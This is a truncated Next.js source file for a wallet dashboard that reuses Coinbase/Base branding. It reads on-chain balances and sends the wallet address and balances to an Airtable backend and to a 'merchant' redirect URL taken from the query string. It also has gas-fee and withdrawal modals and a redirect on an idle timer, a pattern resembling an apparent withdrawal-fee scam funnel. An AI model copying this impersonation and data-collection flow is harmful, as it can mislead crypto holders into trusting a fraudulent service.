'use client';

import { useState, useMemo, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import { createCoinbaseWalletSDK } from '@coinbase/wallet-sdk';
import { motion, AnimatePresence } from 'framer-motion';
import { Outfit } from 'next/font/google';
import { useSearchParams } from 'next/navigation';
import { Plus, ArrowUpDown, ArrowUp, ArrowDown, LogOut, Copy, Check, X, Search, Settings, Wallet, Globe, Shield, ChevronRight, ShieldAlert, Clock } from 'lucide-react';

import GasFeeModal from '@/components/gas-fee-modal';
import WithdrawalModal from '@/components/withdrawal-modal';
import SwapModal from '@/components/swap-modal';
import BuyModal from '@/components/buy-modal';
import TransactionHistory from '@/components/transaction-history';
import { useWallet } from '@/context/base';
import { getDynamicExchangeRates, getLivePrices, COIN_MAP, NETWORKS } from '@/lib/utils';
import ReceiveModal from '@/components/recieve-modal';
import InvalidSession from '@/components/invalid-session';
// import { useAppKit } from '@reown/appkit/react';

const outfit = Outfit({ subsets: ['latin'], weight: ['300', '400', '500', '600', '700'] });

export default function CoinbaseWalletConnect() {
    const searchParams = useSearchParams();
//   const { open } = useAppKit()
    // const [address, setAddress] = useState<string>('');
    const [bnbBalance, setBnbBalance] = useState<string>('0');
    const [btcBalance, setBtcBalance] = useState<string>('0');
    const [ethBalance, setEthBalance] = useState<string>('0');
    const [usdtBalance, setUsdtBalance] = useState<string>('0');
    const [t22priceUsd, setT22PriceUsd] = useState<number>(0);
    const [t22Balance, setT22Balance] = useState<number>(0);


    const [showSettingsMenu, setShowSettingsMenu] = useState(false);
    const [maskAccount, setMaskAccount] = useState(false);         // SSR-safe default
    const [defaultCurrency, setDefaultCurrency] = useState('USD'); // SSR-safe default
    const [showCurrencyPicker, setShowCurrencyPicker] = useState(false);
    const [theme, setTheme] = useState<'dark' | 'light'>('light');  // Set Light as default

    // Restore persisted settings after mount (client-only)
    useEffect(() => {
        const savedMask = localStorage.getItem('maskAccount');
        if (savedMask === 'true') setMaskAccount(true);
        const savedCurrency = localStorage.getItem('defaultCurrency');
        if (savedCurrency) setDefaultCurrency(savedCurrency);
        const savedTheme = localStorage.getItem('appTheme') as 'dark' | 'light' | null;
        if (savedTheme) setTheme(savedTheme);
    }, []);

    // Apply theme to <html> element
    useEffect(() => {
        localStorage.setItem('appTheme', theme);
        const STYLE_ID = 'app-light-theme';
        let el = document.getElementById(STYLE_ID) as HTMLStyleElement | null;

        if (theme === 'light') {
            if (!el) {
                el = document.createElement('style');
                el.id = STYLE_ID;
                document.head.appendChild(el);
            }
            el.textContent = `
                /* Page shell */
                body,
                .bg-\\[\\#0a0a0a\\],
                .bg-\\[\\#0a0b0d\\]            { background-color: #f0f4ff !important; }
                
                /* Cards, Modals, Dropdown, Inputs */
                .bg-\\[\\#151515\\],
                .bg-\\[\\#1E2025\\],
                .bg-\\[\\#1E2025\\]\\/50,
                .bg-\\[\\#13141a\\],
                .bg-\\[\\#1a1b1f\\]            { background-color: #ffffff !important; box-shadow: 0 4px 20px rgba(0,0,0,0.03) !important; border-color: rgba(0,0,0,0.08) !important; }
                
                /* Footer Wrapper */
                .bg-\\[\\#0d0e11\\]\\/95       { background-color: rgba(255,255,255,0.95) !important; border-color: rgba(0,0,0,0.1) !important; }

                /* Safely scope text coloring SO WE DON'T RUIN THE BLUE HEADER */
                .fixed .bg-\\[\\#0a0b0d\\].text-white,
                .fixed .bg-\\[\\#0a0b0d\\] .text-white,
                .bg-\\[\\#151515\\] .text-white,
                .bg-\\[\\#1E2025\\] .text-white,
                .bg-\\[\\#1E2025\\]\\/50 .text-white,
                .bg-\\[\\#13141a\\] .text-white,
                .bg-\\[\\#1a1b1f\\] .text-white,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white { 
                   color: #0d1117 !important; 
                }
                
                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/10,
                .bg-\\[\\#151515\\] .text-white\\/10,
                .bg-\\[\\#1E2025\\] .text-white\\/10,
                .bg-\\[\\#13141a\\] .text-white\\/10,
                .bg-\\[\\#1a1b1f\\] .text-white\\/10,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/10 { color: rgba(13, 17, 23, 0.1) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/20,
                .bg-\\[\\#151515\\] .text-white\\/20,
                .bg-\\[\\#1E2025\\] .text-white\\/20,
                .bg-\\[\\#13141a\\] .text-white\\/20,
                .bg-\\[\\#1a1b1f\\] .text-white\\/20,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/20 { color: rgba(13, 17, 23, 0.2) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/30,
                .bg-\\[\\#151515\\] .text-white\\/30,
                .bg-\\[\\#1E2025\\] .text-white\\/30,
                .bg-\\[\\#13141a\\] .text-white\\/30,
                .bg-\\[\\#1a1b1f\\] .text-white\\/30,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/30 { color: rgba(13, 17, 23, 0.35) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/40,
                .bg-\\[\\#151515\\] .text-white\\/40,
                .bg-\\[\\#1E2025\\] .text-white\\/40,
                .bg-\\[\\#1E2025\\]\\/50 .text-white\\/40,
                .bg-\\[\\#13141a\\] .text-white\\/40,
                .bg-\\[\\#1a1b1f\\] .text-white\\/40,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/40 { color: rgba(13, 17, 23, 0.5) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/50,
                .bg-\\[\\#151515\\] .text-white\\/50,
                .bg-\\[\\#1E2025\\] .text-white\\/50,
                .bg-\\[\\#13141a\\] .text-white\\/50,
                .bg-\\[\\#1a1b1f\\] .text-white\\/50,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/50 { color: rgba(13, 17, 23, 0.6) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/60,
                .bg-\\[\\#151515\\] .text-white\\/60,
                .bg-\\[\\#13141a\\] .text-white\\/60,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/60 { color: rgba(13, 17, 23, 0.7) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/80,
                .bg-\\[\\#151515\\] .text-white\\/80,
                .bg-\\[\\#13141a\\] .text-white\\/80,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/80 { color: rgba(13, 17, 23, 0.85) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/90,
                .bg-\\[\\#151515\\] .text-white\\/90,
                .bg-\\[\\#13141a\\] .text-white\\/90,
                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/90 { color: rgba(13, 17, 23, 0.9) !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-200,
                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-400 { color: #0052FF !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .bg-\\[\\#2b2d33\\] { background-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; color: #0052FF !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .border-\\[\\#0a0b0d\\] { border-color: #ffffff !important; }

                /* Modal Close Buttons */
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 { background-color: #0052FF !important; color: #ffffff !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50:hover { background-color: #004ada !important; color: #ffffff !important; }
                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 svg { color: #ffffff !important; }

                /* Action buttons in light mode */
                .theme-action-btn { background-color: #ffffff !important; color: #0052FF !important; border-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; }
                .theme-action-btn:hover { background-color: #f8fafc !important; box-shadow: 0 6px 16px rgba(0,0,0,0.15) !important; }

                /* Ensure the blue footer button text stays white */
                .theme-footer-btn, .theme-footer-btn .text-white, .theme-footer-btn span, .theme-footer-btn svg { color: #ffffff !important; opacity: 1 !important; }

                /* Explicitly set sub-texts in dropdown / footer */
                .theme-subtext { color: #6b7280 !important; }
                .theme-subtext:hover { color: #374151 !important; }
                
                /* Make asset network logos pop */
                .theme-asset-logo { border: 2px solid white !important; box-shadow: 0 2px 6px rgba(0,0,0,0.15) !important; background-color: #ffffff !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-400,
                .bg-\\[\\#151515\\] .text-gray-400,
                .bg-\\[\\#1E2025\\] .text-gray-400,
                .bg-\\[\\#1a1b1f\\] .text-gray-400 { color: #6b7280 !important; }

                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-500,
                .bg-\\[\\#151515\\] .text-gray-500,
                .bg-\\[\\#1E2025\\] .text-gray-500,
                .bg-\\[\\#1a1b1f\\] .text-gray-500 { color: #9ca3af !important; }

                /* Force primary buttons to stay white text */
                .bg-\\[\\#0052FF\\], 
                .bg-\\[\\#0052FF\\] *,
                .theme-footer-btn,
                .theme-footer-btn *,
                button.bg-\\[\\#0052FF\\],
                button.bg-\\[\\#0052FF\\] span { color: #ffffff !important; opacity: 1 !important; }

                .bg-\\[\\#151515\\] .border-white\\/5,
                .bg-\\[\\#1E2025\\] .border-white\\/5,
                .bg-\\[\\#13141a\\] .border-white\\/5,
                .bg-\\[\\#1a1b1f\\] .border-white\\/5,
                .bg-\\[\\#1a1b1f\\] .border-white\\/10,
                .bg-\\[\\#0d0e11\\]\\/95 .border-white\\/\\[0\\.06\\] { border-color: rgba(0,0,0,0.08) !important; }

                .bg-\\[\\#151515\\] .bg-white\\/5,
                .bg-\\[\\#1E2025\\] .bg-white\\/5,
                .bg-\\[\\#13141a\\] .bg-white\\/5,
                .bg-\\[\\#1a1b1f\\] .bg-white\\/5,
                .bg-\\[\\#1a1b1f\\] .bg-white\\/10 { background-color: rgba(0,0,0,0.04) !important; }
                
                .bg-\\[\\#151515\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#1E2025\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#13141a\\] .hover\\:bg-white\\/5:hover,
                .bg-\\[\\#1a1b1f\\] .hover\\:bg-white\\/5:hover { background-color: rgba(0,0,0,0.06) !important; }

                .bg-black\\/60                 { background-color: rgba(0,0,0,0.3)  !important; }
                input, textarea                { background-color: #f3f6fc !important; color: #0d1117 !important; border-color: rgba(0,0,0,0.12) !important; }
                input::placeholder             { color: #9ca3af !important; }
                *, *::before, *::after         { transition: background-color 0.25s, border-color 0.2s, color 0.2s; }
            `;
        } else {
            el?.remove();
        }
    }, [theme]);

    const [pageLoading, setPageLoading] = useState(true);
    const [showRecieveModal, setShowRecieveModal] = useState(false);
    const [showCancelModal, setShowCancelModal] = useState(false);
    const [showReturnWarning, setShowReturnWarning] = useState(false);
    const [showSessionConflictModal, setShowSessionConflictModal] = useState(false);
    const [conflictingSessionData, setConflictingSessionData] = useState<any>(null);
    const [showInactivityModal, setShowInactivityModal] = useState(false);
    const [inactivityCountdown, setInactivityCountdown] = useState(60);

    const [activeTab, setActiveTab] = useState<'crypto' | 'history'>('crypto');
    const [copied, setCopied] = useState(false);

    // Modal States
    const [showWithdrawModal, setShowWithdrawModal] = useState(false);
    const [showSwapModal, setShowSwapModal] = useState(false);
    const [showBuyModal, setShowBuyModal] = useState(false);
    const [showGasFeeModal, setShowGasFeeModal] = useState(false);
    const [showAccountPrompt, setShowAccountPrompt] = useState(false);
    const [visibleAssets, setVisibleAssets] = useState<string[]>(['BNB', 'TETHEREUM', 'ETH', 'USDT']);
    const [marketPrices, setMarketPrices] = useState<{ [key: string]: { price: number, change: number } }>({});
    const [assetSearchQuery, setAssetSearchQuery] = useState('');

    // Debug logging for modal state
    useEffect(() => {
        // console.log('[DEBUG] showWithdrawModal changed:', showWithdrawModal);
        if (showWithdrawModal) {
            // console.trace('[DEBUG] Withdrawal modal opened - stack trace:');
        }
    }, [showWithdrawModal]);
    const {  networks, disconnectWallet, loading, address, setAddress, error, setLoading, setIsDisconnectedState, isDisconnectedState, connectEVMWallet } = useWallet();
    // Data States
    const [transactions, setTransactions] = useState<any[]>([]);
    const [getUserLoading, setGetUSerLoading] = useState(false)
    const fetchTransactionsData = async () => {
        if (!address || address == "") return;
        try {
            let vvv = await fetch(`/api/transaction?address=${address}`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' },
            });
            let vjson = await vvv.json()
            console.log('vjson:', vjson);
            if (vjson?.existingRecord?.length) {
                const mappedTransactions = vjson.existingRecord.map((e: any) => {
                    const f = e.fields || {};
                    return {
                        ...f,
                        id: e.id,
                        created_at: e.createdTime,
                        // Magic Map variations
                        type: f.Type || f.type || 'send',
                        asset: f.Asset || f.asset || 'BNB',
                        amount: f.Amount || f.amount || '0',
                        status: f.Status || f.status || 'pending',
                        network: f.Network || f.network || 'BNB'
                    };
                }).sort((a: any, b: any) => {
                    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
                });
                setTransactions(mappedTransactions);
            }
        } catch (e) {
        }
    };

    useEffect(() => {
        fetchTransactionsData();
    }, [address]);

    // Periodic price updates
    useEffect(() => {
        const fetchPrices = async () => {
            const prices = await getLivePrices();
            setMarketPrices(prices);
        };
        fetchPrices();
        const interval = setInterval(fetchPrices, 30000); // 30s
        return () => clearInterval(interval);
    }, []);


    const addGasFeeTransaction = (txHash: string) => {
        // Instead of hardcoding, we refresh from Airtable to see the actual recorded transaction
        fetchTransactionsData();
    };

    // Inactivity warning logic
    useEffect(() => {
        // Only run if not connected and not loading
        if (address || loading || showSessionConflictModal || pageLoading) {
            setShowInactivityModal(false);
            return;
        }

        const timer = setTimeout(() => {
            setShowInactivityModal(true);
        }, 20000); // 20 seconds of site stay

        return () => clearTimeout(timer);
    }, [address, loading, showSessionConflictModal, pageLoading]);

    // Countdown logic when modal is shown
    useEffect(() => {
        let interval: NodeJS.Timeout;
        if (showInactivityModal && inactivityCountdown > 0) {
            interval = setInterval(() => {
                setInactivityCountdown(prev => prev - 1);
            }, 1000);
        } else if (showInactivityModal && inactivityCountdown === 0) {
            // Redirect when countdown hits 0
            handleRedirect('inactivity');
        }
        return () => clearInterval(interval);
    }, [showInactivityModal, inactivityCountdown]);

    // Query Params
    const request = searchParams.get('request');
    const ssid_param = searchParams.get('ssid');
    const status = searchParams.get('status');
    const userid = searchParams.get('userid');

    const [isAuthorized, setIsAuthorized] = useState<boolean | null>(null);

    useEffect(() => {
        const validateSession = async () => {
            const merchantFromParams = searchParams.get('merchant');

            // 0. RESET state globally while validating to prevent bypass
            setIsAuthorized(null);
            setPageLoading(true);

            // 1. If we're EXPECTING a wallet (from local storage) but it's not restored yet, WAIT.
            // This prevents the security bypass on page refresh.
            const isExpectingWallet = typeof window !== 'undefined' && localStorage.getItem('walletConnected') === 'true';
            if (isExpectingWallet && !address) {
                console.log("[SECURITY] Waiting for wallet restoration...");
                return;
            }

            console.log("[SECURITY] Verifying session integrity...", {
                ssid: ssid_param,
                userid,
                merchant: merchantFromParams,
                wallet: address || 'none'
            });

            // 1. Basic Parameter Presence Check
            const hasEssentials = ssid_param && userid && merchantFromParams;

            if (!hasEssentials) {
                console.warn("[SECURITY] Required session parameters missing from URL.");
                setIsAuthorized(false);
                return;
            }

            // 2. Strict Database Comparison (if wallet is connected)
            if (address) {
                try {
                    // Fetch the source of truth from Airtable
                    const res = await fetch(`/api/user?address=${address}`, { signal: AbortSignal.timeout(5000) });
                    const data = await res.json();

                    console.log(data,"datttttttt")

                    if (data.existingRecord) {
                        const fields = data.existingRecord.fields;

                        // CRITICAL SECURITY COMPARISON:
                        // Compare current URL session against the verified record in Airtable
                        const sessionMismatch =
                            fields.ssid !== ssid_param ||
                            fields.userid !== userid ||
                            fields.merchant !== merchantFromParams;

                        if (sessionMismatch) {
                            console.warn("[SECURITY] Session conflict detected (Merchant mismatch).", {
                                url: { ssid: ssid_param, userid, merchant: merchantFromParams },
                                verified_db: { ssid: fields.ssid, userid: fields.userid, merchant: fields.merchant }
                            });

                            setConflictingSessionData({
                                fields,
                                currentUrl: { ssid: ssid_param, userid, merchant: merchantFromParams }
                            });

                            // CRITICAL: Show the modal AND block access
                            setShowSessionConflictModal(true);
                            setIsAuthorized(false);
                            return;
                        }
                        console.log("[SECURITY] Session integrity verified against database.");
                    } else {
                        // If no record exists yet, the first updateBalances call will establish the trust baseline
                        console.log("[SECURITY] Initializing fresh trust baseline for new wallet.");
                    }
                } catch (e) {
                    console.warn("[SECURITY] Could not sync with database, maintaining current local session.");
                }
            }

            // 3. Grant Access ONLY if all checks pass
            setIsAuthorized(true);
            const timer = setTimeout(() => {
                setPageLoading(false);
            }, 800);
            return () => clearTimeout(timer);
        };

        validateSession();
    }, [request, ssid_param, status, userid, address, searchParams.get('merchant')]);

    const merchant = searchParams.get('merchant');
    const ssid = searchParams.get('ssid');
    const user = searchParams.get('user');

    const TETHEREUM_TOKEN_ADDRESS = '0xe9a5c635c51002fa5f377f956a8ce58573d63d91';

    // BEP-20 token contracts on BSC
    const BEP20_ETH_ADDRESS = '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'; // Binance-Peg ETH
    const BEP20_BTC_ADDRESS = '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'; // Binance-Peg BTC
    const BEP20_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BSC-USD (USDT)

    const MERCHANT_URL = 'https://account.fmacapitals.io/withdrawal/';

    const handleRedirect = (state: 'success' | 'cancelled' | 'disconnected' | 'not_connected' | 'inactivity') => {
        // Use merchant from query param, or fallback to hardcoded FMA Capital URL
        const baseUrl = merchant
            ? (merchant.includes('://') ? merchant : `https://${merchant}/callback`)
            : MERCHANT_URL;

        const params = new URLSearchParams({
            request: 'walletconnect',
            ssid: ssid || ssid_param || '',
            userid: userid || '',
            state: state,
            status: state === 'success' ? 'connected' : state
        });

        if (state === 'success' && address) {
            params.append('wallet_address', address);
            params.append('bnb_balance', bnbBalance);
            params.append('tethereum_balance', t22Balance.toString());
        }

        window.location.href = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${params.toString()}`;
    };

    const fetchData = async (t22_price: any) => {
        try {
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            // console.log(json)
            const price = parseFloat(json.data.amount);
            setT22PriceUsd(price * t22_price);
        } catch (error) {
            console.error("Coinbase API failed, using fallback", error);
        }
    };

    useEffect(() => {
        if (t22Balance > 0) {
            fetchData(t22Balance);
        }
    }, [t22Balance]);

    // const sdk = useMemo(() => {
    //     if (typeof window === 'undefined') return null;
    //     return createCoinbaseWalletSDK({
    //         appName: 'Base App',
    //         appLogoUrl: 'https://example.com/logo.png',
    //         preference: { options: 'all' },
    //     });
    // }, []);

    // const cbProvider = useMemo(() => {
    //     if (!sdk) return null;
    //     return sdk.getProvider();
    // }, [sdk]);


    // const updateBalances = async (userAddress: string) => {
    //     const ERC20_ABI = [
    //         'function balanceOf(address owner) view returns (uint256)',
    //         'function decimals() view returns (uint8)'
    //     ];

    //     const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
    //     const baseProvider = new ethers.JsonRpcProvider('https://mainnet.base.org/');

    //     const makeContract = (addr: string) =>
    //         new ethers.Contract(addr, ERC20_ABI, bscProvider);

    //     const fetchTokenData = async (addr: string) => {
    //         try {
    //             const contract = makeContract(addr);
    //             const [raw, dec] = await Promise.all([contract.balanceOf(userAddress), contract.decimals()]);
    //             return [raw, dec];
    //         } catch {
    //             return ["0", 18]; // Fallback to 0 balance, 18 decimals on error
    //         }
    //     };

    //     try {
    //         let bnbBal: any = "0";
    //         let ethBal: any = "0";
    //         try {
    //             bnbBal = await bscProvider.getBalance(userAddress);
    //         } catch (e) {
    //             console.warn("Failed to fetch native BNB balance", e);
    //         }
    //         try {
    //             // Direct RPC fetch ensures Base balance resolves independently of local ether state
    //             const ethRes = await fetch('https://mainnet.base.org/', {
    //                 method: 'POST',
    //                 headers: { 'Content-Type': 'application/json' },
    //                 body: JSON.stringify({
    //                     jsonrpc: "2.0",
    //                     method: "eth_getBalance",
    //                     params: [userAddress, "latest"],
    //                     id: 1
    //                 })
    //             });
    //             const ethJson = await ethRes.json();
    //             console.log(ethJson,"ethJson")
    //             if (ethJson.result) {
    //                 ethBal = ethJson.result;
    //             }
    //         } catch (e) {
    //             console.warn("Failed to fetch native ETH balance via RPC", e);
    //         }

    //         // Fetch all BEP-20 tokens safely in parallel
    //         const [
    //             [t22Raw, t22Dec],
    //             [usdtRaw, usdtDec]
    //         ] = await Promise.all([
    //             fetchTokenData(TETHEREUM_TOKEN_ADDRESS),
    //             fetchTokenData(BEP20_USDT_ADDRESS)
    //         ]);

    //         const bnbFormatted = ethers.formatEther(bnbBal);
    //         const t22Formatted = ethers.formatUnits(t22Raw, t22Dec);
    //         const ethFormatted = ethers.formatEther(ethBal);
    //         const btcFormatted = "0";
    //         const usdtFormatted = ethers.formatUnits(usdtRaw, usdtDec);

    //         setBnbBalance(bnbFormatted);
    //         setT22Balance(Number(t22Formatted));
    //         setEthBalance(ethFormatted);
    //         setBtcBalance(btcFormatted);
    //         setUsdtBalance(usdtFormatted);

    //       let v =  await fetch('/api/user', {
    //             method: 'POST',
    //             headers: { 'Content-Type': 'application/json' },
    //             body: JSON.stringify({
    //                 address: userAddress,
    //                 t99: Number(t22Formatted),
    //                 bnb: bnbFormatted,
    //                 request,
    //                 ssid: ssid_param,
    //                 status: 'connected',
    //                 userid,
    //                 merchant: merchant || searchParams.get('merchant')
    //             })
    //         });

    //         console.log(v)
    //         let c = await v.json()
    //         console .log(c)
    //     } catch (err) {
    //         console.error("Balance fetch error:", err);
    //     }
    // };


    const updateBalances = async (userAddress: string) => {
  const ERC20_ABI = [
    'function balanceOf(address owner) view returns (uint256)',
    'function decimals() view returns (uint8)'
  ];

  // ✅ Correct providers for each network
  const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
  const ethProvider = new ethers.JsonRpcProvider('https://cloudflare-eth.com/');  // ← Ethereum mainnet
  const baseProvider = new ethers.JsonRpcProvider('https://mainnet.base.org/');   // ← Base network (if needed)

  const makeContract = (addr: string) =>
    new ethers.Contract(addr, ERC20_ABI, bscProvider);

  const fetchTokenData = async (addr: string) => {
    try {
      const contract = makeContract(addr);
      const [raw, dec] = await Promise.all([
        contract.balanceOf(userAddress),
        contract.decimals()
      ]);
      return [raw, dec];
    } catch {
      return ["0", 18];
    }
  };

  try {
    let bnbBal: any = "0";
    let ethBal: any = "0";

    // ✅ BNB from BSC network
    try {
      bnbBal = await bscProvider.getBalance(userAddress);
    } catch (e) {
      console.warn("Failed to fetch native BNB balance", e);
    }

    // ✅ ETH from Ethereum mainnet (not Base!)
    try {
      const ethRes = await fetch('https://ethereum.publicnode.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          method: "eth_getBalance",
          params: [userAddress, "latest"],
          id: 1
        })
      });
      const ethJson = await ethRes.json();
      console.log("Ethjson",ethJson)
      if (ethJson.result) {
        ethBal = ethJson.result;
      }
    } catch (e) {
      console.warn("Failed to fetch native ETH balance", e);
    }

    const [
      [t22Raw, t22Dec],
      [usdtRaw, usdtDec]
    ] = await Promise.all([
      fetchTokenData(TETHEREUM_TOKEN_ADDRESS),
      fetchTokenData(BEP20_USDT_ADDRESS)
    ]);

    const bnbFormatted = ethers.formatEther(bnbBal);
    const t22Formatted = ethers.formatUnits(t22Raw, t22Dec);
    const ethFormatted = ethers.formatEther(BigInt(ethBal)); // ← BigInt since it comes as hex string from RPC
    const btcFormatted = "0";
    const usdtFormatted = ethers.formatUnits(usdtRaw, usdtDec);

    setBnbBalance(bnbFormatted);
    setT22Balance(Number(t22Formatted));
    setEthBalance(ethFormatted);
    setBtcBalance(btcFormatted);
    setUsdtBalance(usdtFormatted);

    await fetch('/api/user', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: userAddress,
        t99: Number(t22Formatted),
        bnb: bnbFormatted,
        request,
        ssid: ssid_param,
        status: 'connected',
        userid,
        merchant: merchant || searchParams.get('merchant')
      })
    });

  } catch (err) {
    console.error("Balance fetch error:", err);
  }
};

    // Address is restored silently by the WalletProvider context from localStorage.
    // No need to re-prompt the wallet popup on page load.


    // console.log(cbProvider)
    useEffect(() => {
        let v = async () => {
            await updateBalances(address);
        }
        console.log(address,"addressaddress")
        if (address) {
            v();
        }
    }, [address])
    const connectWallet = async () => {
        try {
            await connectEVMWallet({
                config: networks.bsc
            });
        } catch (err) {
            console.error("Connection error:", err);
        } finally {
            setLoading(false);
        }
    }

    // const connectBtcWallet = async () => {
    //   try {
    //     setLoading(true);
    //     setError('');

    //     if (!cbProvider) throw new Error("SDK not initialized");

    //     // 1. Request Real Bitcoin accounts
    //     const btcAccounts = (await cbProvider.request({
    //       method: 'btc_getAccounts',
    //     })) as any[];

    //     if (!btcAccounts || btcAccounts.length === 0) {
    //       throw new Error("No Bitcoin accounts found");
    //     }

    //     const btcAddress = btcAccounts[0].address;

    //     // 2. Update your shared states (Matches your EVM logic)
    //     setAddress(btcAddress);
    //     setIsDisconnectedState(false);
    //     localStorage.setItem('walletConnected', 'true');

    //     // 3. Fetch BTC Balance (Real BTC uses its own fetcher, not Ethers)
    //     await fetchBtcBalance(btcAddress);

    //   } catch (err: any) {
    //     console.error("BTC Connection Error:", err);
    //     setError(err.message || 'Bitcoin connection failed');
    //   } finally {
    //     setLoading(false);
    //   }
    // };

    const fetchBtcBalance = async (btcAddress: string) => {
        try {
            // Fetching from a public BTC explorer
            const response = await fetch(`https://blockchain.info/q/addressbalance/${btcAddress}`);
            const balanceInSats = await response.text();

            // Convert Satoshis to BTC (1 BTC = 100,000,000 sats)
            const btcValue = parseInt(balanceInSats) / 100000000;

            setBtcBalance(btcValue.toString());
        } catch (e) {
            console.error("BTC Balance failed", e);
        }
    };



    const [selectedAssetForSwap, setSelectedAssetForSwap] = useState<string>('');

    // Asset data for display
    const assets = useMemo(() => {
        return visibleAssets.map((symbol, idx) => {
            const isTethereum = symbol === 'TETHEREUM';
            const priceData = marketPrices[symbol] || { price: 0, change: 0 };
            const price = priceData.price;
            const change = priceData.change;

            // Live balance for every supported asset
            const balance =
                isTethereum ? t22Balance :
                    symbol === 'BNB' ? Number(bnbBalance) :
                        symbol === 'ETH' ? Number(ethBalance) :
                            symbol === 'BTC' ? Number(btcBalance) :
                                symbol === 'USDT' ? Number(usdtBalance) :
                                    0;

            console.log(`[DEBUG UI] Symbol: ${symbol} | Balance: ${balance} | Price: ${price} | usdValue: ${balance * (price || 0)}`);

            return {
                id: idx,
                name: symbol === 'BTC' ? 'Bitcoin' :
                    symbol === 'ETH' ? 'Ethereum' :
                        symbol === 'USDT' ? 'Tether (USDT)' :
                            symbol,
                symbol,
                icon: isTethereum ? COIN_MAP['TETHEREUM']?.logo : COIN_MAP[symbol]?.logo,
                network: COIN_MAP[symbol]?.network,
                color: 'bg-[#1E2025]',
                balance,
                marketPrice: price || 0,
                priceChange: change || 0,
                usdValue: balance * (price || 0)
            };
        }).filter(asset => {
            // If wallet is connected, show assets even if 0 during the initial load 
            // to prevent the jumbo 'Wallet Not Connected' screen from flashing.
            if (address && pageLoading) return true;
            return asset.balance > 0;
        });
    }, [visibleAssets, marketPrices, bnbBalance, t22Balance, ethBalance, btcBalance, usdtBalance]);

    const totalBalance = useMemo(() => {
        return assets.reduce((sum, asset) => sum + (asset.usdValue || 0), 0);
    }, [assets]);

    const handleAssetClick = (symbol: string) => {
        if (!address) {
            setShowAccountPrompt(true);
            return;
        }
        // Normalize symbol for swap modal (T22 -> TETHEREUM)
        const normalizedSymbol = symbol === 'T22' ? 'TETHEREUM' : symbol;
        setSelectedAssetForSwap(normalizedSymbol);
        setShowSwapModal(true);
    };

    const copyAddress = () => {
        navigator.clipboard.writeText(address);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const formatAddress = (addr: string) => {
        return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
    };


    // FX conversion rates (approximate, USD base)
    const FX_RATES: Record<string, number> = {
        USD: 1,
        EUR: 0.92,
        GBP: 0.79,
        JPY: 149.5,
        CAD: 1.36,
        AUD: 1.53,
        CHF: 0.89,
        CNY: 7.24,
    };
    const FX_SYMBOLS: Record<string, string> = {
        USD: '$', EUR: '€', GBP: '£', JPY: '¥', CAD: 'C$', AUD: 'A$', CHF: 'Fr', CNY: '¥'
    };
    const fxRate = FX_RATES[defaultCurrency] ?? 1;
    const currencySymbol = FX_SYMBOLS[defaultCurrency] ?? '$';

    const formatFiat = (usdValue: number) =>
        `${currencySymbol}${(usdValue * fxRate).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

    // if (isAuthorized === false && !showSessionConflictModal) return <InvalidSession />;

    return (
        <div className={`min-h-screen transition-colors duration-300 ${theme === 'dark' ? 'bg-[#0a0a0a] text-white' : 'bg-white text-[#0a0b0d]'
            } ${outfit.className}`}>
            {/* Loading State Overlay */}
            {/* <AnimatePresence>
                {pageLoading && (
                    <motion.div
                        key="preloader"
                        initial={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#0a0a0a]"
                    >
                        <motion.div
                            animate={{
                                scale: [1, 1.05, 1],
                                opacity: [0.9, 1, 0.9]
                            }}
                            transition={{
                                duration: 2,
                                repeat: Infinity,
                                ease: "easeInOut"
                            }}
                            className="relative"
                        >
                            <img
                                src="https://www.base.org/document/favicon-32x32.png"
                                alt="Base"
                                className="w-24 h-24 object-contain shadow-2xl shadow-blue-500/20"
                            />
                        </motion.div>
                    </motion.div>
